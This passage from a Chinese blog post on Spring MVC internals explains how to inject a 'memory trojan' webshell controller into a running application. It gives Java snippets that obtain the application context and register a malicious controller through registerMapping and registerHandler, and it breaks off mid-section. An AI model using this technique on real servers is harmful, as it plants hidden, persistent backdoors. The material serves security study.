容器；而 ContextLoaderListener 所创建的是一个 Root Context，代表全局唯一的一个公共 IoC 容器。</p><p>如果要访问和操作 bean ，一般要获得当前代码执行环境的IoC 容器 代表者 ApplicationContext。</p><ul><li>Spring 应用中可以同时有多个 Context，其中只有一个 Root Context，剩下的全是 Child Context</li><li>所有Child Context都可以访问在 Root Context中定义的 bean，但是Root Context无法访问Child Context中定义的 bean</li><li>所有的Context在创建后，都会被作为一个属性添加到了 ServletContext中</li></ul><h4 id="ContextLoaderListener"><a href="#ContextLoaderListener" class="headerlink" title="ContextLoaderListener"></a>ContextLoaderListener</h4><p>ContextLoaderListener主要用来初始化全局唯一的Root Context，即Root WebApplicationContext，它会和其他Child Context实例共享自己的IoC容器，以便Child Context获取并使用容器里的bean。</p><h3 id="Spring-MVC"><a href="#Spring-MVC" class="headerlink" title="Spring MVC"></a>Spring MVC</h3><h5 id="Spring-MVC的运行流程"><a href="#Spring-MVC的运行流程" class="headerlink" title="Spring MVC的运行流程"></a>Spring MVC的运行流程</h5><img src="/img/3-12/2.png">         客户端发送Request，DispatcherServlet(等同于Controller控制器)，控制器接收到请求，来到HandlerMapping（在配置文件中配置），HandlerMapping会对URL进行解析，并判断当前URL该交给哪个Controller来处理，找到对应的Controller之后，Controller就跟Server、JavaBean进行交互，得到某一个值，并返回一个视图（ModelAndView过程），Dispathcher通过ViewResolver视图解析器,找到ModelAndView对象指定的视图对象,最后，视图对象负责渲染返回给客户端。<img src="/img/3-12/3.png"><p>配置springmvc</p><pre class="language-markup" data-language="markup"><code class="language-markup"> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>context-param</span><span class="token punctuation">&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>param-name</span><span class="token punctuation">&gt;</span></span>contextConfigLocation<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>param-name</span><span class="token punctuation">&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>param-value</span><span class="token punctuation">&gt;</span></span>/WEB-INF/applicationContext.xml<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>param-value</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>context-param</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>servlet</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>servlet-name</span><span class="token punctuation">&gt;</span></span>dispatcherServlet<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>servlet-name</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>servlet-class</span><span class="token punctuation">&gt;</span></span>org.springframework.web.servlet.DispatcherServlet<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>servlet-class</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>init-param</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>param-name</span><span class="token punctuation">&gt;</span></span>contextConfigLocation<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>param-name</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>param-value</span><span class="token punctuation">&gt;</span></span>classpath:springmvc.xml<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>param-value</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>init-param</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>servlet</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>servlet-mapping</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>servlet-name</span><span class="token punctuation">&gt;</span></span>dispatcherServlet<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>servlet-name</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>url-pattern</span><span class="token punctuation">&gt;</span></span>/<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>url-pattern</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>servlet-mapping</span><span class="token punctuation">&gt;</span></span><span class="token comment">&lt;!--添加Spring内置的过滤器，解决乱码问题--&gt;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>filter</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>filter-name</span><span class="token punctuation">&gt;</span></span>encodingFilter<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>filter-name</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>filter-class</span><span class="token punctuation">&gt;</span></span>org.springframework.web.filter.CharacterEncodingFilter<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>filter-class</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>init-param</span><span class="token punctuation">&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>param-name</span><span class="token punctuation">&gt;</span></span>encoding<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>param-name</span><span class="token punctuation">&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>param-value</span><span class="token punctuation">&gt;</span></span>UTF-8<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>param-value</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>init-param</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>filter</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>filter-mapping</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>filter-name</span><span class="token punctuation">&gt;</span></span>encodingFilter<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>filter-name</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>url-pattern</span><span class="token punctuation">&gt;</span></span>/*<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>url-pattern</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>filter-mapping</span><span class="token punctuation">&gt;</span></span></code></pre><p>看下其中的<context-param>与<listener>，当没有显式配置 ContextLoaderListener的contextConfigLocation时，程序会自动寻找/WEB-INF/applicationContext.xml作为配置文件</listener></context-param></p><h4 id="DispatcherServlet"><a href="#DispatcherServlet" class="headerlink" title="DispatcherServlet"></a>DispatcherServlet</h4><p>它的主要作用是处理传入的web请求，根据配置的URL，将请求分发给正确的 Controller和View。DispatcherServlet初始化完成后，会创建一个普通的Child Context实例。对于DispatcherServlet，实际上它本质就是一个Servlet，现在来回看web.xml中的这一段</p><pre class="language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>servlet</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>servlet-name</span><span class="token punctuation">&gt;</span></span>dispatcherServlet<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>servlet-name</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>servlet-class</span><span class="token punctuation">&gt;</span></span>org.springframework.web.servlet.DispatcherServlet<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>servlet-class</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>init-param</span><span class="token punctuation">&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>param-name</span><span class="token punctuation">&gt;</span></span>contextConfigLocation<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>param-name</span><span class="token punctuation">&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>param-value</span><span class="token punctuation">&gt;</span></span>/WEB-INF/dispatcherServlet-servlet.xml<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>param-value</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>init-param</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>load-on-startup</span><span class="token punctuation">&gt;</span></span>1<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>load-on-startup</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>servlet</span><span class="token punctuation">&gt;</span></span></code></pre><h3 id="Tomcat使用Spring、SpringMVC"><a href="#Tomcat使用Spring、SpringMVC" class="headerlink" title="Tomcat使用Spring、SpringMVC"></a>Tomcat使用Spring、SpringMVC</h3><p>Tomcat无法启动，或者是启动后404,没有加载上springmvc的DispatcherServlet<br>踩坑：<a href="https://blog.csdn.net/qq_50231389/article/details/118015734">https://blog.csdn.net/qq_50231389/article/details/118015734</a><br>其实不是上面说的那回事，使用了spring 6版本，把版本改低就ok了</p><p>web.xml</p><pre class="language-markup" data-language="markup"><code class="language-markup"><span class="token prolog">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>web-app</span> <span class="token attr-name">xmlns</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://xmlns.jcp.org/xml/ns/javaee<span class="token punctuation">"</span></span>         <span class="token attr-name"><span class="token namespace">xmlns:</span>xsi</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://www.w3.org/2001/XMLSchema-instance<span class="token punctuation">"</span></span>         <span class="token attr-name"><span class="token namespace">xsi:</span>schemaLocation</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd<span class="token punctuation">"</span></span>         <span class="token attr-name">version</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>4.0<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>servlet</span><span class="token punctuation">&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>servlet-name</span><span class="token punctuation">&gt;</span></span>dispatcherServlet<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>servlet-name</span><span class="token punctuation">&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>servlet-class</span><span class="token punctuation">&gt;</span></span>org.springframework.web.servlet.DispatcherServlet<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>servlet-class</span><span class="token punctuation">&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>init-param</span><span class="token punctuation">&gt;</span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>param-name</span><span class="token punctuation">&gt;</span></span>contextConfigLocation<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>param-name</span><span class="token punctuation">&gt;</span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>param-value</span><span class="token punctuation">&gt;</span></span>classpath:spring-mvc.xml<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>param-value</span><span class="token punctuation">&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>init-param</span><span class="token punctuation">&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>load-on-startup</span><span class="token punctuation">&gt;</span></span>1<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>load-on-startup</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>servlet</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>servlet-mapping</span><span class="token punctuation">&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>servlet-name</span><span class="token punctuation">&gt;</span></span>dispatcherServlet<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>servlet-name</span><span class="token punctuation">&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>url-pattern</span><span class="token punctuation">&gt;</span></span>/<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>url-pattern</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>servlet-mapping</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>web-app</span><span class="token punctuation">&gt;</span></span></code></pre><p>这里对应spring-mvc.xml</p><pre class="language-markup" data-language="markup"><code class="language-markup"><span class="token prolog">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>beans</span> <span class="token attr-name">xmlns</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://www.springframework.org/schema/beans<span class="token punctuation">"</span></span>       <span class="token attr-name"><span class="token namespace">xmlns:</span>mvc</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://www.springframework.org/schema/mvc<span class="token punctuation">"</span></span>       <span class="token attr-name"><span class="token namespace">xmlns:</span>xsi</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://www.w3.org/2001/XMLSchema-instance<span class="token punctuation">"</span></span>       <span class="token attr-name"><span class="token namespace">xmlns:</span>context</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://www.springframework.org/schema/context<span class="token punctuation">"</span></span>       <span class="token attr-name"><span class="token namespace">xsi:</span>schemaLocation</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://www.springframework.org/schema/beans        http://www.springframework.org/schema/beans/spring-beans.xsd        http://www.springframework.org/schema/mvc        http://www.springframework.org/schema/mvc/spring-mvc.xsd http://www.springframework.org/schema/context https://www.springframework.org/schema/context/spring-context.xsd<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token namespace">mvc:</span>annotation-driven</span><span class="token punctuation">/&gt;</span></span>    <span class="token comment">&lt;!-- 1.使用注解，扫描项目中的包 --&gt;</span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token namespace">context:</span>component-scan</span> <span class="token attr-name">base-package</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>com.yyjccc.memorytrojan.Spring.controller<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span><span class="token namespace">context:</span>component-scan</span><span class="token punctuation">&gt;</span></span>    <span class="token comment">&lt;!-- 2.开启注解 --&gt;</span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token namespace">mvc:</span>annotation-driven</span><span class="token punctuation">/&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>beans</span><span class="token punctuation">&gt;</span></span></code></pre><h2 id="Controller型"><a href="#Controller型" class="headerlink" title="Controller型"></a>Controller型</h2><p>和Tomcat内存马类似，我们就需要了解如何动态的注册Controller，思路如下</p><ol><li>获取上下文环境</li><li>注册恶意Controller</li><li>配置路径映射</li></ol><h3 id="获取Context"><a href="#获取Context" class="headerlink" title="获取Context"></a>获取Context</h3><p>有四种方法</p><ul><li><p>getCurrentWebApplicationContext</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token class-name">WebApplicationContext</span> context <span class="token operator">=</span> <span class="token class-name">ContextLoader</span><span class="token punctuation">.</span><span class="token function">getCurrentWebApplicationContext</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>getCurrentWebApplicationContext 获得的是一个 XmlWebApplicationContext 实例类型的 Root WebApplicationContext。</p></li><li><p>WebApplicationContextUtils</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token class-name">WebApplicationContext</span> context <span class="token operator">=</span> <span class="token class-name">WebApplicationContextUtils</span><span class="token punctuation">.</span><span class="token function">getWebApplicationContext</span><span class="token punctuation">(</span><span class="token class-name">RequestContextUtils</span><span class="token punctuation">.</span><span class="token function">getWebApplicationContext</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token class-name">ServletRequestAttributes</span><span class="token punctuation">)</span><span class="token class-name">RequestContextHolder</span><span class="token punctuation">.</span><span class="token function">currentRequestAttributes</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getRequest</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getServletContext</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>或者是</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token class-name">WebApplicationContext</span> context <span class="token operator">=</span> <span class="token class-name">WebApplicationContextUtils</span><span class="token punctuation">.</span><span class="token function">getWebApplicationContext</span><span class="token punctuation">(</span><span class="token class-name">RequestContextUtils</span><span class="token punctuation">.</span><span class="token function">findWebApplicationContext</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token class-name">ServletRequestAttributes</span><span class="token punctuation">)</span><span class="token class-name">RequestContextHolder</span><span class="token punctuation">.</span><span class="token function">currentRequestAttributes</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getRequest</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getServletContext</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>根据RequestContextHolder.currentRequestAttributes()).getRequest()拿到当前请求并获取ServletContext<br>再拿到ApplicationContext</p><img src="/img/3-12/4.png"></li><li><p>RequestContextUtils</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token class-name">WebApplicationContext</span> webApplicationContext <span class="token operator">=</span> <span class="token class-name">RequestContextUtils</span><span class="token punctuation">.</span><span class="token function">findWebApplicationContext</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token class-name">ServletRequestAttributes</span><span class="token punctuation">)</span> <span class="token class-name">RequestContextHolder</span><span class="token punctuation">.</span><span class="token function">currentRequestAttributes</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getRequest</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>通过 ServletRequest 类的实例来获得 Child WebApplicationContext。</p></li><li><p>getAttribute</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token class-name">WebApplicationContext</span> context3 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">WebApplicationContext</span><span class="token punctuation">)</span><span class="token class-name">RequestContextHolder</span><span class="token punctuation">.</span><span class="token function">currentRequestAttributes</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getAttribute</span><span class="token punctuation">(</span><span class="token string">"org.springframework.web.servlet.DispatcherServlet.CONTEXT"</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre></li></ul><h3 id="动态注册Controller"><a href="#动态注册Controller" class="headerlink" title="动态注册Controller"></a>动态注册Controller</h3><p>Spring Controller 的动态注册，就是对 RequestMappingHandlerMapping 注入的过程。<br>调试一下：<br>断点打到我们的Controller类中方法内，<br>查看函数调用栈，看看是怎么调到此方法的<br><img src="/img/3-12/5.png"><br>从doGet逐层往下看<br><img src="/img/3-12/6.png"><br>到AbstractHandlerMethodAdapter#handle方法，<br>之前都只是request,和response参数一直往下传，现在发现多了一个handler<br><img src="/img/3-12/7.png"><br>发现handler中已经有封装好了目标方法，即我们写的处理业务的方法<br><img src="/img/3-12/8.png"><br>那之后反射调用即可。<br>看看handler怎么来的<br>doDispatch方法中<br><img src="/img/3-12/9.png"><br>DispatcherServlet#getHandler方法中<br><img src="/img/3-12/10.png"><br><img src="/img/3-12/11.png"><br>第一个就是RequestMappingHandlerMapping，for循环遍历拿到它，并根据request拿取HandlerChain。<br>思路清晰了就是从RequestMappingHandlerMapping中根据URL拿到要调用方法<br>攻击思路就是往里面注入新的映射，从而调用我们的恶意方法</p><p>RequestMappingHandlerMapping是springMVC里面的核心Bean，spring把我们的controller解析成RequestMappingInfo对象，然后再注册进RequestMappingHandlerMapping中，这样请求进来以后就可以根据请求地址调用到Controller类里面了</p><ul><li>RequestMappingHandlerMapping对象本身是spring来管理的，可以通过ApplicationContext取到，所以并不需要我们新建。</li><li>在SpringMVC框架下，会有两个ApplicationContext，一个是Spring IOC的上下文，这个是在java web框架的Listener里面配置，就是我们经常用的web.xml里面的org.springframework.web.context.ContextLoaderListener，由它来完成IOC容器的初始化和bean对象的注入。</li><li>另外一个是ApplicationContext是由org.springframework.web.servlet.DispatcherServlet完成的，具体是在org.springframework.web.servlet.FrameworkServlet#initWebApplicationContext()这个方法做的。而这个过程里面会完成RequestMappingHandlerMapping这个对象的初始化。</li></ul><p>Spring 3.1 开始及以后一般开始使用新的<br>org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping<br>映射器来支持@Contoller和@RequestMapping注解。</p><p>拿request去匹配已经注册好的RequestMappingInfo，即用URL路径匹配Contorller<br>再根据RequestMappingInfo对象从map中拿到handler</p><p>上面调式继续下去<br>走到RequestMappingHandlerMapping的父类AbstractHandlerMethodMapping#getHandlerInternal<br><img src="/img/3-12/12.png"><br>这里还对this.mappingRegistry加了读锁（：<br>那应该就是操作这个属性<br>后面发现最后是mappingRegistry的register属性中拿到的<br><img src="/img/3-12/13.png"><br><img src="/img/3-12/14.png"><br>这下就是找注入的方法（直接抄现成的了）</p><h4 id="registerMapping"><a href="#registerMapping" class="headerlink" title="registerMapping"></a>registerMapping</h4><p>在Spring 4.0及以后，可以使用registerMapping直接注册requestMapping<br>步骤：</p><ul><li>获取context</li><li>获取RequestMappingHandlerMapping</li><li>反射拿到要调用的方法</li><li>创建RequestMappingInfo，对应着一个Controller</li><li>注册进入RequestMappingHandlerMapping<pre class="language-java" data-language="java"><code class="language-java"><span class="token comment">// 1. 从当前上下文环境中获得 RequestMappingHandlerMapping 的实例 bean</span><span class="token class-name">RequestMappingHandlerMapping</span> r <span class="token operator">=</span> context<span class="token punctuation">.</span><span class="token function">getBean</span><span class="token punctuation">(</span><span class="token class-name">RequestMappingHandlerMapping</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 2. 通过反射获得自定义 controller 中唯一的 Method 对象</span><span class="token class-name">Method</span> method <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">Class</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"me.landgrey.SSOLogin"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getDeclaredMethods</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token comment">// 3. 定义访问 controller 的 URL 地址</span><span class="token class-name">PatternsRequestCondition</span> url <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">PatternsRequestCondition</span><span class="token punctuation">(</span><span class="token string">"/hahaha"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 4. 定义允许访问 controller 的 HTTP 方法（GET/POST）</span><span class="token class-name">RequestMethodsRequestCondition</span> ms <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">RequestMethodsRequestCondition</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 5. 在内存中动态注册 controller</span><span class="token class-name">RequestMappingInfo</span> info <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">RequestMappingInfo</span><span class="token punctuation">(</span>url<span class="token punctuation">,</span> ms<span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span>r<span class="token punctuation">.</span><span class="token function">registerMapping</span><span class="token punctuation">(</span>info<span class="token punctuation">,</span> <span class="token class-name">Class</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"恶意Controller"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> method<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre></li></ul><p>Spring 2.5 开始到 Spring 3.1 之前一般使用<br>org.springframework.web.servlet.mvc.annotation.DefaultAnnotationHandlerMapping映射器 ；</p><h4 id="registerHandler"><a href="#registerHandler" class="headerlink" title="registerHandler"></a>registerHandler</h4><p>(版本古老，暂且就不复现了（：）<br>参考上面的 HandlerMapping 接口继承关系图，针对使用 DefaultAnnotationHandlerMapping 映射器的应用，可以找到它继承的顶层类org.springframework.web.servlet.handler.AbstractUrlHandlerMapping<br>在其registerHandler()方法中<br><img src="/img/3-12/15.png"><br>该方法接受 urlPath参数和 handler参数，可以在 this.getApplicationContext() 获得的上下文环境中寻找名字为 handler 参数值的 bean, 将 url 和 controller 实例 bean 注册到 handlerMap 中</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token comment">// 1. 在当前上下文环境中注册一个名为 dynamicController 的 Webshell controller 实例 bean</span>context<span class="token punctuation">.</span><span class="token function">getBeanFactory</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">registerSingleton</span><span class="token punctuation">(</span><span class="token string">"dynamicController"</span><span class="token punctuation">,</span> <span class="token class-name">Class</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"me.landgrey.SSOLogin"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 2. 从当前上下文环境中获得 DefaultAnnotationHandlerMapping 的实例 bean</span><span class="token class-name"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>web<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span>mvc<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span>DefaultAnnotationHandlerMapping</span>  dh <span class="token operator">=</span> context<span class="token punctuation">.</span><span class="token function">getBean</span><span class="token punctuation">(</span><span class="token class-name"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>web<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span>mvc<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span>DefaultAnnotationHandlerMapping</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 3. 反射获得 registerHandler Method</span><span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span></span>Method</span> m1 <span class="token operator">=</span> <span class="token class-name"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>web<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span>handler<span class="token punctuation">.</span></span>AbstractUrlHandlerMapping</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">getDeclaredMethod</span><span class="token punctuation">(</span><span class="token string">"registerHandler"</span><span class="token punctuation">,</span> <span class="token class-name">String</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> <span class="token class-name">Object</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>m1<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 4. 将 dynamicController 和 URL 注册到 handlerMap 中</span>m1<span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span>dh<span class="token punctuation">,</span> <span class="token string">"/favicon"</span><span class="token punctuation">,</span> <span class="token string">"dynamicController"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><h4 id="detectHandlerMethods"><a href="#detectHandlerMethods" class="headerlink" title="detectHandlerMethods"></a>detectHandlerMethods</h4><p>参考上面的 HandlerMapping 接口继承关系图，针对使用 RequestMappingHandlerMapping 